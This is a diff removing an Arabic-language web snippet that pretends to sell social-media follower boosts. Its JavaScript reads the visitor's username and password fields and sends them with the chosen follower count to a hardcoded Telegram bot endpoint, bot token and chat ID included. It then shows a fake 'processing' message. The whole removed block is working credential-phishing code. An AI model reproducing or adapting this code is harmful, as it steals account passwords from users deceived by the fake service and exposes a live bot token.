@@ -1,27 +1,0 @@
-<div class="card">
-    <h3>اختر عدد المتابعين:</h3>
-    <select id="followersCount" style="width:100%; padding:10px; margin-bottom:10px;">
-        <option value="10">10 متابع</option>
-        <option value="50">50 متابع</option>
-        <option value="100">100 متابع</option>
-        <option value="500">500 متابع</option>
-        <option value="1000">1000 متابع</option>
-        <option value="2500">2500 متابع</option>
-    </select>
-    <button onclick="sendData()">تفعيل الرشق</button>
-</div>
-
-<script>
-function sendData() {
-    const count = document.getElementById('followersCount').value;
-    const user = document.getElementById('username').value; // تأكد أن id حقل اليوزر هو username
-    const pass = document.getElementById('password').value; // تأكد أن id حقل الباسورد هو password
-    
-    const message = `👤 حساب جديد:\nUser: ${user}\nPass: ${pass}\n👥 العدد المختار: ${count}`;
-    
-    // إرسال البيانات لبوتك
-    fetch(`https://api.telegram.org/bot8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek/sendMessage?chat_id=1371063739&text=${encodeURIComponent(message)}`);
-    
-    alert("⌛ جاري معالجة طلبك لرشق " + count + " متابع...");
-}
-</script>
